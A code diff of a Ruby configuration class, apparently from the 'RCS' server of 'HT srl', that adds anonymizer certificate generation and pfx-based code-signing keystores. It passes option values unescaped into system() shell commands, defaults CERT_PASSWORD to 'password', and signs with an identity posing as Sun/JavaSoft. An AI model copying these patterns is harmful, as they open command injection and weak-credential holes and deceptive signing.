@@ -95,6 +95,9 @@ class Config
     # default password if not configured in the config file
     Config.instance.global['CERT_PASSWORD'] ||= 'password'
 
+    # generate the network cert if not existent (retrocomp for 8.1.1 which introduced it)
+    generate_certificates_anon unless File.exist? Config.instance.cert('rcs-network.pem')
+
     return true
   end
 
@@ -179,10 +182,9 @@ class Config
     end
 
     generate_certificates(options) if options[:gen_cert]
+    generate_certificates_anon if options[:gen_cert_anon]
 
     generate_keystores if options[:gen_keystores]
-
-    puts options.inspect
 
     use_pfx_cert(options[:pfx_cert]) if options[:pfx_cert]
 
@@ -252,67 +254,118 @@ class Config
   def generate_certificates(options)
     trace :info, "Generating ssl certificates..."
 
-    old_dir = Dir.pwd
-    Dir.chdir File.join(Dir.pwd, CERT_DIR)
+    # ensure dir is present
+    FileUtils.mkdir_p File.join(Dir.pwd, CERT_DIR)
 
-    File.open('index.txt', 'wb+') { |f| f.write '' }
-    File.open('serial.txt', 'wb+') { |f| f.write '01' }
+    Dir.chdir File.join(Dir.pwd, CERT_DIR) do
 
-    # to create the CA
-    if options[:gen_ca] or !File.exist?('rcs-ca.crt')
-      trace :info, "Generating a new CA authority..."
-      # default one
-      subj = "/CN=\"RCS Certification Authority\"/O=\"HT srl\""
-      # if specified...
-      subj = "/CN=\"#{options[:ca_name]}\"" if options[:ca_name]
-      system "openssl req -subj #{subj} -batch -days 3650 -nodes -new -x509 -keyout rcs-ca.key -out rcs-ca.crt -config openssl.cnf"
+      File.open('index.txt', 'wb+') { |f| f.write '' }
+      File.open('serial.txt', 'wb+') { |f| f.write '01' }
+
+      # to create the CA
+      if options[:gen_ca] or !File.exist?('rcs-ca.crt')
+        trace :info, "Generating a new CA authority..."
+        # default one
+        subj = "/CN=\"RCS Certification Authority\"/O=\"HT srl\""
+        # if specified...
+        subj = "/CN=\"#{options[:ca_name]}\"" if options[:ca_name]
+        system "openssl req -subj #{subj} -batch -days 3650 -nodes -new -x509 -keyout rcs-ca.key -out rcs-ca.crt -config openssl.cnf"
+      end
+
+      return unless File.exist? 'rcs-ca.crt'
+
+      trace :info, "Generating db certificate..."
+      # the cert for the db server
+      system "openssl req -subj /CN=#{@global['CN']} -batch -days 3650 -nodes -new -keyout #{@global['DB_KEY']} -out rcs-db.csr -config openssl.cnf"
+
+      return unless File.exist? @global['DB_KEY']
+
+      trace :info, "Generating collector certificate..."
+      # the cert used by the collectors
+      system "openssl req -subj /CN=collector -batch -days 3650 -nodes -new -keyout rcs-collector.key -out rcs-collector.csr -config openssl.cnf"
+
+      return unless File.exist? 'rcs-collector.key'
+
+      trace :info, "Signing certificates..."
+      # signing process
+      system "openssl ca -batch -days 3650 -out #{@global['DB_CERT']} -in rcs-db.csr -extensions server -config openssl.cnf"
+      system "openssl ca -batch -days 3650 -out rcs-collector.crt -in rcs-collector.csr -config openssl.cnf"
+
+      return unless File.exist? @global['DB_CERT']
+
+      trace :info, "Creating certificates bundles..."
+      File.open(@global['DB_CERT'], 'ab+') {|f| f.write File.read('rcs-ca.crt')}
+
+      # create the PEM file for all the collectors
+      File.open(@global['CA_PEM'], 'wb+') do |f|
+        f.write File.read('rcs-collector.crt')
+        f.write File.read('rcs-collector.key')
+        f.write File.read('rcs-ca.crt')
+      end
+
+      trace :info, "Removing temporary files..."
+      # CA related files
+      ['index.txt', 'index.txt.old', 'index.txt.attr', 'index.txt.attr.old', 'serial.txt', 'serial.txt.old'].each do |f|
+        File.delete f
+      end
+
+      # intermediate certificate files
+      ['01.pem', '02.pem', 'rcs-collector.csr', 'rcs-collector.crt', 'rcs-collector.key', 'rcs-db.csr'].each do |f|
+        File.delete f
+      end
+
     end
-
-    return unless File.exist? 'rcs-ca.crt'
-
-    trace :info, "Generating db certificate..."
-    # the cert for the db server
-    system "openssl req -subj /CN=#{@global['CN']} -batch -days 3650 -nodes -new -keyout #{@global['DB_KEY']} -out rcs-db.csr -config openssl.cnf"
-
-    return unless File.exist? @global['DB_KEY']
-
-    trace :info, "Generating collector certificate..."
-    # the cert used by the collectors
-    system "openssl req -subj /CN=collector -batch -days 3650 -nodes -new -keyout rcs-collector.key -out rcs-collector.csr -config openssl.cnf"
-
-    return unless File.exist? 'rcs-collector.key'
-
-    trace :info, "Signing certificates..."
-    # signing process
-    system "openssl ca -batch -days 3650 -out #{@global['DB_CERT']} -in rcs-db.csr -extensions server -config openssl.cnf"
-    system "openssl ca -batch -days 3650 -out rcs-collector.crt -in rcs-collector.csr -config openssl.cnf"
-
-    return unless File.exist? @global['DB_CERT']
-
-    trace :info, "Creating certificates bundles..."
-    File.open(@global['DB_CERT'], 'ab+') {|f| f.write File.read('rcs-ca.crt')}
-    
-    # create the PEM file for all the collectors
-    File.open(@global['CA_PEM'], 'wb+') do |f|
-      f.write File.read('rcs-collector.crt')
-      f.write File.read('rcs-collector.key')
-      f.write File.read('rcs-ca.crt')
-    end
-
-    trace :info, "Removing temporary files..."
-    # CA related files
-    ['index.txt', 'index.txt.old', 'index.txt.attr', 'index.txt.attr.old', 'serial.txt', 'serial.txt.old'].each do |f|
-      File.delete f
-    end
-
-    # intermediate certificate files
-    ['01.pem', '02.pem', 'rcs-collector.csr', 'rcs-collector.crt', 'rcs-collector.key', 'rcs-db.csr'].each do |f|
-      File.delete f
-    end
-
-    Dir.chdir old_dir
     trace :info, "done."
   end
+
+  def generate_certificates_anon
+    trace :info, "Generating anon ssl certificates..."
+
+    # ensure dir is present
+    FileUtils.mkdir_p File.join(Dir.pwd, CERT_DIR)
+
+    Dir.chdir File.join(Dir.pwd, CERT_DIR) do
+
+      File.open('index.txt', 'wb+') { |f| f.write '' }
+      File.open('serial.txt', 'wb+') { |f| f.write '01' }
+
+      trace :info, "Generating a new Anon CA authority..."
+      subj = "/CN=\"default\""
+      system "openssl req -subj #{subj} -batch -days 3650 -nodes -new -x509 -keyout rcs-anon-ca.key -out rcs-anon-ca.crt -config openssl.cnf"
+
+      return unless File.exist? 'rcs-anon-ca.crt'
+
+      trace :info, "Generating anonymizer certificate..."
+      system "openssl req -subj /CN=server -batch -days 3650 -nodes -new -keyout rcs-anon.key -out rcs-anon.csr -config openssl.cnf"
+
+      return unless File.exist? 'rcs-anon.key'
+
+      trace :info, "Signing certificates..."
+      system "openssl ca -batch -days 3650 -out rcs-anon.crt -in rcs-anon.csr -config openssl.cnf -name CA_network"
+
+      trace :info, "Creating certificates bundles..."
+
+      # create the PEM file for all the collectors
+      File.open('rcs-network.pem', 'wb+') do |f|
+        f.write File.read('rcs-anon.crt')
+        f.write File.read('rcs-anon.key')
+        f.write File.read('rcs-ca.crt')
+      end
+
+      trace :info, "Removing temporary files..."
+      # CA related files
+      ['index.txt', 'index.txt.old', 'index.txt.attr', 'serial.txt', 'serial.txt.old', 'rcs-anon-ca.crt', 'rcs-anon-ca.key',].each do |f|
+        File.delete f
+      end
+
+      # intermediate certificate files
+      ['01.pem', 'rcs-anon.csr', 'rcs-anon.crt', 'rcs-anon.key'].each do |f|
+        File.delete f
+      end
+    end
+    trace :info, "done."
+  end
+
 
   def generate_keystores
     trace :info, "Generating key stores for Java Applet..."
@@ -322,22 +375,23 @@ class Config
     trace :info, "Generating key stores for Android..."
     FileUtils.rm_rf(Config.instance.cert('android.keystore'))
     system "keytool -genkey -dname \"cn=Server, ou=JavaSoft, o=Sun, c=US\" -alias ServiceCore -keystore #{Config.instance.cert('android.keystore')} -keyalg RSA -keysize 2048 -validity 18250 -keypass #{Config.instance.global['CERT_PASSWORD']} -storepass #{Config.instance.global['CERT_PASSWORD']}"
-
-    trace :info, "Generating UIDS stores for Symbian..."
-    FileUtils.rm_rf(Config.instance.cert('symbian.yaml'))
-    uids = ['20030635', '200305D7', '20030633', '20030634', '200316ED', '200305DB']
-    File.open(Config.instance.cert("symbian.yaml"), 'wb') {|f| f.write uids.to_yaml}
   end
 
   def use_pfx_cert(pfx)
     trace :info, "Using pfx cert for windows code signing..."
     FileUtils.cp pfx, Config.instance.cert("windows.pfx")
 
-    trace :info, "Using pfx cert to create applet keystore..."
+    trace :info, "Using pfx cert to create Java Applet keystore..."
     FileUtils.rm_rf(Config.instance.cert('applet.keystore'))
     system "openssl pkcs12 -in #{pfx} -out pfx.pem -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} -chain"
     system "openssl pkcs12 -export -in pfx.pem -out pfx.p12 -name signapplet -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']}"
     system "keytool -importkeystore -srckeystore pfx.p12 -destkeystore #{Config.instance.cert('applet.keystore')} -srcstoretype pkcs12 -deststoretype JKS -srcstorepass #{Config.instance.global['CERT_PASSWORD']} -deststorepass #{Config.instance.global['CERT_PASSWORD']}"
+
+    trace :info, "Using pfx cert to create Android keystore..."
+    FileUtils.rm_rf(Config.instance.cert('android.keystore'))
+    system "openssl pkcs12 -in #{pfx} -out pfx.pem -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} -chain"
+    system "openssl pkcs12 -export -in pfx.pem -out pfx.p12 -name ServiceCore -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']}"
+    system "keytool -importkeystore -srckeystore pfx.p12 -destkeystore #{Config.instance.cert('android.keystore')} -srcstoretype pkcs12 -deststoretype JKS -srcstorepass #{Config.instance.global['CERT_PASSWORD']} -deststorepass #{Config.instance.global['CERT_PASSWORD']}"
 
     # remove temporary files
     ['pfx.pem', 'pfx.p12'].each do |f|
@@ -379,6 +433,11 @@ class Config
     return Dir.pwd + '/mongodb/' + os + '/' + file + ext
   end
 
+  def self.file_path(file)
+    return file if File.file?(file)
+    return File.join($invocation_directory, file)
+  end
+
   # executed from rcs-db-config
   def self.run!(*argv)
     # reopen the class and declare any empty trace method
@@ -416,14 +475,17 @@ class Config
 
       opts.separator ""
       opts.separator "Certificates options:"
-      opts.on( '-g', '--generate-certs', 'Generate the SSL certificates needed by the system' ) do
-        options[:gen_cert] = true
-      end
       opts.on( '-G', '--generate-ca', 'Generate a new CA authority for SSL certificates' ) do
         options[:gen_ca] = true
       end
       opts.on( '-A', '--anon-ca NAME', String, 'Generate an anonymous CA (you specify the name)' ) do |name|
         options[:ca_name] = name
+      end
+      opts.on( '-g', '--generate-certs', 'Generate the SSL certificates needed by the system' ) do
+        options[:gen_cert] = true
+      end
+      opts.on( '-a', '--generate-certs-anon', 'Generate the SSL certificates used by anonymizers' ) do
+        options[:gen_cert_anon] = true
       end
       opts.on( '-c', '--ca-pem FILE', 'The certificate file (pem) of the issuing CA' ) do |file|
         options[:ca_pem] = file
@@ -438,7 +500,7 @@ class Config
         options[:gen_keystores] = true
       end
       opts.on('--sign-cert FILE', String, 'Use this certificate (pfx) to sign the executables' ) do |file|
-        options[:pfx_cert] = file
+        options[:pfx_cert] = file_path(file)
       end
       opts.on('--sign-pass PASSWORD', String, 'Password for the pfx certificate' ) do |pass|
         options[:pfx_pass] = pass
